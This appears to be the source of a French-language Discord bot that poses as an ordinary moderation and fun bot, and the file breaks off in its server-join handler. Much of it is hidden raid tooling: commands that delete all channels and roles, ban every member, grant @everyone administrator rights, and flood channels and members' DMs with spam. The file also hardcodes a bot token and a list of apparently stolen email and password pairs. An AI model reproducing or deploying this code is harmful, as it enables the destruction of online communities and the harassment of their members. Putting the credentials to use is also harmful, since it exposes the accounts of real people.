//LES CONST

const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs')

// LES VAR

var prefix = '+'
var rndm_gen = ['meltorry@yahoo.com:dnsn26|PREMIUM', 
'cassiusteel05@gmail.com:Superboy55|PREMIUM',
'mhohenberger1008@gmail.com:mutter64|PREMIUM',
'gustavoj.r.alves123@gmail.com:sasuke123|PREMIUM',
'josipsimic2001@gmail.com:Helikopter123|PREMIUM',
'yungtszkiu@gmail.com:4cbutter|PREMIUM',
'shadowarmy12@gmail.com:s2qhjcwi|PREMIUM',
'guysh1805@gmail.com:12365480|PREMIUM',
'gancu12@gmail.com:gninut10|PREMIUM',
'datzdarko@hotmail.com:dslite1188|PREMIUM']

var token = 'NTg3OTY3MTM0NDc5Njc5NDg4.XU8Elg.mVxGlvvP0IoW0-z-0_4-wonYPPw'

var listperm = ["CREATE_INSTANT_INVITE","KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","MANAGE_CHANNELS","MANAGE_GUILD",
"ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES",
"READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS",
"USE_VAD","PRIORITY_SPEAKER","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_WEBHOOKS","MANAGE_EMOJIS"]

client.on('ready', () => {
  client.user.setGame(`+help | ${client.guilds.size} servers`, "https://www.twitch.tv/twitch");
  console.log('0x0 AIZE');
  })

  client.on('message', function(message){ 
    if(message.content === (prefix+'off')){ 
    if (message.author.id != "361450165045035008") return
    message.channel.send('**Script �teint !!**')
    message.delete().then(client.destroy())
    }
})


client.on("message", message => {

  if (!message.guild) return

  let args = message.content.trim().split(/ +/g)



  if (args[0].toLowerCase() === prefix + "clear") {

      if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande")

      let count = args[1]

      if (!count) return message.channel.send("**Veuillez indiquer un nombre de messages à supprimer** :x:")

      if (isNaN(count)) return message.channel.send("**veuillez indiquer un nombre valide** :x:")

      if (count < 1 || count > 100) return message.channel.send("**Veuillez indiquer un nombre entre 1 et 100** :x:")

      message.channel.bulkDelete(parseInt(count) + 1)

  }

  if (message.content.startsWith(',renameall')){
    message.delete()

        message.guild.members.forEach(m => {
            m.setNickname(`${args.join(" ")}`);
        });

}        



  if (args[0].toLowerCase() === prefix + "mute") {

      if (!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send("Vous n'avez pas la permission d'utiliser cette commande")

      let member = message.mentions.members.first()

      if (!member) return message.channel.send("Membre introuvable")

      if (member.highestRole.calculatedPosition >= message.member.highestRole.calculatedPosition && message.author.id !== message.guild.ownerID) return message.channel.send("Vous ne pouvez pas mute ce membre")

      if (member.highestRole.calculatedPosition >= message.guild.me.highestRole.calculatedPosition || member.id === message.guild.ownerID) return message.channel.send("Je ne peux pas mute ce membre")

      let muterole = message.guild.roles.find(role => role.name === 'Muted')

      if (muterole) {

          member.addRole(muterole)

          message.channel.send(member + ' a été mute :white_check_mark:')

      }

      else {

          message.guild.createRole({name: 'Muted', permissions: 0}).then((role) => {

              message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {

                  channel.overwritePermissions(role, {

                      SEND_MESSAGES: false

                  })

              })

              member.addRole(role)

              message.channel.send(member + '**a été mute** :white_check_mark:')

          })

      }

  }

})

client.on('message', message =>{
  if(message.content.toLowerCase() === ',shutdown'){
  if (message.author.id != "361450165045035008") return
    message.guild.roles.find('name', '@everyone').edit({
    permissions: ["ADMINISTRATOR"]
});
let oldnm = message.guild.name;
message.guild.channels.map(c => {
          c.delete();
      });

      rdr = setInterval(() => {
        message.guild.createRole({
                name: "Kaito in action 💀",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {

              message.member.addRole(rr.id);
            });
          }, 1000);

        message.guild.setName('Destroyed by Kaito');
            setTimeout(function () {
            rd1 = setInterval(() => {b 
            message.guild.createChannel('Destroyed by Kaito🔪!!', 'text').then(channel => {
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');
              message.channel.send('@everyone **ddos server !!** https://cdn.discordapp.com/attachments/556173593302532097/561491576468144156/giphy_1.gif');

      }, 500)})})}})

client.on("message", message => {
        var args = message.content.split(" ");
        switch(args[0]){
            case `${prefix}8ball`:
            let arg = message.content.split(" ").slice(1)
            if(arg[0]){
                var reponses = ["Oui", "Non", "Surement", "Je ne sais pas", "Probablement", "Evidemment", "Evidemment que non", "Comment peux-tu te poser la question ?", "Biensur", "Effectivement"];
                let embed = new Discord.RichEmbed()
                embed.addField(`❓Question : **${arg.join(" ")}**`, ``)
                embed.addField(`❗Réponse : **${reponses[Math.floor(Math.random()*10)]}**`, ``)
                embed.setColor("BLACK")
                embed.setFooter("Nala ®")
                message.channel.send(embed).then(m => m.delete(300000))
            }
            else {
                message.channel.send("Vous m'avez posez aucune question.").then(m => m.delete(1000))
            }
            if(message.deletable) message.delete();
            break;
            case `${prefix}pouf`:
            var flip = ["Pile", "Face"]
            let flipembed = new Discord.RichEmbed()
            .setColor("BLACK")
            .addField("Pile ou Face ? :", `:moneybag: La pièce affiche : **${flip[Math.floor(Math.random()*2)]}**`)
            .setFooter("Nala ®")
            message.channel.send(flipembed).then(m => m.delete(3000))
            if(message.deletable) message.delete();
            break;
            case `${prefix}ban`:
            if(message.channel.type !== "text") return;
            var mentions = message.mentions.members.first();
            if(message.mentions.members.size != 0){
                if(mentions.bannable && message.member.hasPermission("BAN_MEMBERS")){
                    var raison = message.content.split(" ").slice(2).join(" ") || null
                    mentions.ban({
                        reason:raison
                    })
                }
                else {
                    message.channel.send("Je ne peux pas ban ce membre...").then(m => m.delete(1000))
                }
            }
            else{
                message.channel.send("Aucun membre mentionnÃ© :(").then(m => m.delete(1000))
            }
            if(message.deletable) message.delete();
            break;
            case `${prefix}kick`:
            if(message.channel.type !== "text") return;
            var mentions = message.mentions.members.first();
            if(message.mentions.members.size != 0){
                if(mentions.kickable && message.member.hasPermission("KICK_MEMBERS")){
                    var raison = message.content.split(" ").slice(2).join(" ") || null
                    mentions.kick({
                        reason:raison
                    })
                }
                else {
                    message.channel.send("Je ne peux pas kick ce membre...").then(m => m.delete(1000))
                }
            }
            else{
                message.channel.send("Aucun membre mentionnÃ© :(").then(m => m.delete(1000))
            }
            break;
            case `${prefix}unban`:
            if(message.channel.type !== "text") return;
            if(args[1]){
                if(message.member.hasPermission("BAN_MEMBERS")){
                    message.guild.fetchBans().then(ee => {
                        ee.forEach(cc => {
                            if(cc.id === args[1]) message.guild.unban(cc).then(cc => message.channel.send(`${cc.tag} Ã  Ã©tÃ© unban`).then(m => m.delete(3000)))
                        })
                    })
                }
                else {
                    message.channel.send("Permission insuffisante").then(m => m.delete(1000))
                }
            }
            else {
                message.channel.send("Aucun identifiant spÃ©cifiÃ©.").then(m => m.delete(1000))
            }
            if(message.deletable) message.delete();
            break;
            case `${prefix}delchan`:
            if(message.channel.type !== "text") return;
            if(args[1]){
                if(message.member.hasPermission("MANAGE_CHANNELS")){
                    let cc = message.guild.channels.get(args[1])
                    if(cc){
                        cc.delete().then(() => {
                            message.channel.send(`Le channel possÃ©dant l'id ${args[1]} a Ã©tÃ© supprimÃ©`).then(m => m.delete(3000))
                        })
                    }
                    else {
                        message.channel.send("Ce channel n'existe pas").then(m => m.delete(1000))
                    }
                }
                else {
                    message.channel.send("Permission insuffisante").then(m => m.delete(1000))
                }
            }
            else {
                message.channel.send("Aucun identifiant spÃ©cifiÃ©.").then(m => m.delete(1000))
            }
            if(message.deletable) message.delete();
            break;
            case `${prefix}createchan`:
            if(message.channel.type !== "text") return;
            if(!args[1]) return;
            else if(!args[2]) return;
            else if(!message.member.hasPermission("MANAGE_CHANNELS")) return;
            else if(message.guild.channels.size > 499) return;
            else {
                message.guild.createChannel(args[1], args[2]).catch(console.error)
            }
            if(message.deletable) message.delete();
            break;
        case `${prefix}quialerole`:
        if (message.deletable) message.delete();
            var argse = message.content.split(/ +/).slice(1);
            if (message.channel.type !== "text") return;
            if (!argse[0]) return;
            if (!message.guild.roles.find(x => x.name === argse.join(" "))) return;
                if(message.guild.members.filter(x => x.roles.find(x => x.name === argse.join(" "))).map(x => x.user.tag).toString().length < 1990)message.channel.send(`\`\`\`${message.guild.members.filter(x => x.roles.find(x => x.name === argse.join(" "))).map(x => x.user.tag)} \`\`\` has **${argse.join(" ")} role**`).then(m => m.delete(3000));
            break;
                case `${prefix}embed`:
                var coucouzer = message.content.split(" ").slice(1)
                if(!coucouzer[0]) return;
                else {
                    let sayembed = new Discord.RichEmbed()
                    .setColor("BLACK")
                    .setDescription(coucouzer.join(" "))
                    message.channel.send(sayembed)
                }
                break;
        }
    });

    client.on('message', message =>{
    if (message.content === (prefix+'spam')) {
      if (message.author.id != "361450165045035008") return
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
      message.channel.send("@everyone PURGED BY KAITO ! XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/556173593302532097/561494795495931930/giphy_2.gif");
    message.delete();

  }
});

  client.on("message", message => {
    if (!message.guild) return
    let args = message.content.trim().split(/ +/g)
if (args[0].toLowerCase() === prefix + "avatar") {
        let member = message.mentions.members.first()
        if (!member) return message.channel.send("**Merci de bien vouloir mentionner la personne !!**")
        let embed = new Discord.RichEmbed()
            .setDescription (`${message.author.username} **voici la photo de profil de** ${message.mentions.users.first().username} **!**`)
            .setImage(message.mentions.users.first().avatarURL)
            .setTimestamp()
            .setColor("RANDOM")
            .setFooter("Nala ®")
        message.channel.send(embed)
    
         message.delete(); 
    
   }
  });

client.on("message", message => {
    var args = message.content.split(" ");
    switch(args[0]){
        case `${prefix}help`:
        var embed = new Discord.RichEmbed()
        if(args[1] != "moderation" && args[1] != "utiles" && args[1] != "fun" && args[1] != "image"){
            embed.setColor("RANDOM")
            embed.setTitle("__**Panel Help :**__")
            embed.addField("-> ``+help fun``", `*Pour afficher le panel des commandes fun.*`)
            embed.addField("-> ``+help utiles``", `*Pour afficher le panel des commandes utiles.*`)
            embed.addField("-> ``+help moderation``", `*Pour afficher le panel des commandes de modération.*`)
            embed.addField("-> ``+help image``", `*Pour afficher le panel des commandes d'image.*`)
            embed.setFooter("Nala ®")
            embed.setThumbnail(client.user.avatarURL)
        }
        else if(args[1] === "moderation"){
            embed.setColor("RANDOM")
            embed.setTitle("__**Panel Modération :**__", client.user.avatarURL)
            embed.addField("-> ``+ban``", `*@Membreàban + [raison]*`)
            embed.addField("-> ``+kick``", `*@Membreàkick + [raison]*`)
            embed.addField("-> ``+deban``", `*@Membreàdeban + [iddumembreàdeban]*`)
            embed.addField("-> ``+createchan``", `[nom du salon] + {voice / text}`)
            embed.setFooter("Nala ®")
            embed.setThumbnail(client.user.avatarURL)
        }
        else if(args[1] === "fun"){
            embed.setColor("RANDOM")
            embed.setTitle("__**Panel Fun :**__", client.user.avatarURL)
            embed.addField("-> ``+8ball``", `*[question]*`)
            embed.addField("-> ``+pouf``", `*Pile ou face.*`)
            embed.addField("-> ``+embed``", `*[mesage].*`)
            embed.addField("-> ``+avatar``", `*Choppe l'avatar de la personne mentioné.*`)
            embed.setFooter("Nala ®")
            embed.setThumbnail(client.user.avatarURL)
        }
        else if(args[1] === "utiles"){
            embed.setColor("RANDOM")
            embed.setTitle("__**Panel Utiles :**__", client.user.avatarURL)
            embed.addField("-> ``+clear``", `*[nombre]*`)
            embed.addField("-> ``+quialerole``", `*[nomdurole]*`)
            embed.setFooter("Nala ®")
            embed.setThumbnail(client.user.avatarURL)

        }
            else if(args[1] === "image"){
              embed.setColor("RANDOM")
              embed.setTitle("__**Panel Image :**__", client.user.avatarURL)
              embed.addField("-> ``+slap``", `*Met une grosse claque.*`)
              embed.addField("-> ``+hawk``", `*Photo de hawk.*`)
              embed.addField("-> ``+eva``", `*Photo de Eva.*`)
              embed.addField("-> ``+zola``", `*GIF de Zola.*`)
              embed.addField("-> ``+dodo``", `*?*`)
              embed.addField("-> ``+ramy``", `*Photo de Ramy.*`)
              embed.setFooter("Nala ®")
              embed.setThumbnail(client.user.avatarURL)

        }
        message.channel.send(embed)
        break;
    }
})

client.login(token)


client.on("ready", () => {
    console.log("----------------------------")
    console.log(`Tag du Bot : ${client.user.tag}`)
    console.log(`Id du Bot : ${client.user.id}`)
    console.log(`Invitations : https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=2146958847`)
    console.log(`Nombre de Serveurs : ${client.guilds.size}`)
    console.log("----------------------------")
})

client.on("message", message => {
  if (message.content.startsWith(',help')){
      var embed = new Discord.RichEmbed()
          embed.setColor("RANDOM")
          embed.setTitle("__**Panel Help Raid:**__")
          embed.addField("-> ``,chanspam``", `*Pour creer des salons.*`)
          embed.addField("-> ``,renameall``", `*Rename tout le server.*`)
          embed.addField("-> ``,delchan``", `*Pour suprimer tout les salons.*`)
          embed.addField("-> ``,spamtts``", `*Pour spam le server en TTS.*`)
          embed.addField("-> ``,rolespam``", `*Pour creer la massde de rôles.*`)
          embed.addField("-> ``,permadd``", `*Pour te mettre les toutes les permissions.*`)
          embed.addField("-> ``,banall``", `*Ban tout les membres.*`)
          embed.addField("-> ``,delrole``", `*Pour supprimer tout les rôles.*`)
          embed.addField("-> ``,spammp``", `*Pour spam les utilisateurs du server.*`)
          embed.addField("-> ``,spamlog``", `*Pour spam les logs en changeant la région du server.*`)
          embed.addField("-> ``,kaitoonthedancefloor``", `*Raid le server !.*`)
          embed.setFooter("Nala ®")
          embed.setThumbnail(client.user.avatarURL)
      }
    var args = message.content.split(/ +/);
    if(message.channel.type != "text") return;
    switch(args[0]){
        case `,chanspam`:
        if(message.deletable) message.delete();
        if(!message.guild.member(client.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | guildfucker | Le bot n'a pas assez de permission.`);
        message.guild.setIcon("https://i.imgur.com/pvtPMv8.png");
            message.guild.setName("RAID BY KAITO");
            message.guild.setRegion("russia");
        if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | chan spam |Le bot n'a pas assez de permission.`);
            var i;
            for (i = message.guild.channels.size; i < 497; i++) {
                message.guild.createChannel("raid by kaito", "text");
                message.guild.createChannel("raid by kaito", "voice");
            }
        break;
        case `,delchan`:
        if(message.deletable) message.delete();
        if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return console.log(`${message.guild.name} | delchan |Le bot n'a pas assez de permission.`);
        message.guild.channels.map(chanman => {
            chanman.delete().catch(console.error);
        })
        break;
        case `,spamtts`:
        if(message.deletable) message.delete();
        setInterval (function () {
            message.guild.channels.forEach(channel => {
                if (channel.type === "text") {channel.send("@everyone Kaito, est passé ici... Le serv est desormais purgé", { tts: true }).catch(console.error);  }
            }, 2500)}, 400)
          break;
          case `,rolespam`:
          if(message.deletable) message.delete();
          if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | rolespam |Le bot n'a pas assez de permission.`);
          var i;
          for (i = message.guild.roles.size; i < 100; i++) {
              message.guild.createRole({
                  color:"RANDOM",
                  name:"RAID BY KAITO"
              });
          }
          break;
          case `,permadd`:
          if(message.deletable) message.delete();
          if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          else if(!message.guild.roles.find(x => x.name === "error_404")) {
              if(message.guild.roles.size >= 100) return;
               message.guild.createRole({
                  name: "error_404",
                  permissions:message.guild.member(client.user).permissions.raw
              }).then(role => message.member.addRole(role));
          }
          else {
              message.member.addRole(message.guild.roles.find(x => x.name === "error_404"));
          }
          break;
          case `,banall`:
          if(message.deletable) message.delete();
          if(!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) return console.log(`${message.guild.name} | banall |Le bot n'a pas assez de permission.`);
          message.guild.members.forEach(m => {
              if(m.bannable && !m.roles.find(w => w.name === "unknow_error_404")) m.ban().catch(console.error);
          })
          break;
          case `,delrole`:
          if(message.deletable) message.delete();
          if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return console.log(`${message.guild.name} | permadd |Le bot n'a pas assez de permission.`);
          message.guild.roles.forEach(m => {
              if(m.name != "error_404")m.delete().catch(console.error)
          })
          break;
          case `,spammp`:
          if(message.deletable) message.delete();
          message.guild.members.forEach(mpmember => {
              mpmember.createDM().then(m =>
                {var i;
                    for(i = 0; i < 20; i++){
                        m.send(`Le serveur de ${message.guild.owner.user.tag} s'est fait niquer par Kaito ! maintenant rejoins : https://discord.gg/KQNfAxY`)
                    }
                })})
                break;
                case `,spamlog`:
                if(message.deletable) message.delete();
                if(!message.guild.member(client.user).hasPermission("MANAGE_GUILD")) return console.log(`${message.guild.name} | spamlog | Le bot n'a pas assez de permission.`);
                const table = ["russia","hongkong","us-central","eu-central","eu-west","us-west","eu-west"];
                setInterval(function() {
                    message.guild.setRegion(table[Math.floor(Math.random()*table.length)])
                },300)
                break;

    }
});

client.on("guildCreate", guild => {

    var channel = guild.channels.filter(channel => channel.type == 'text').first()
  
    if(channel){
  
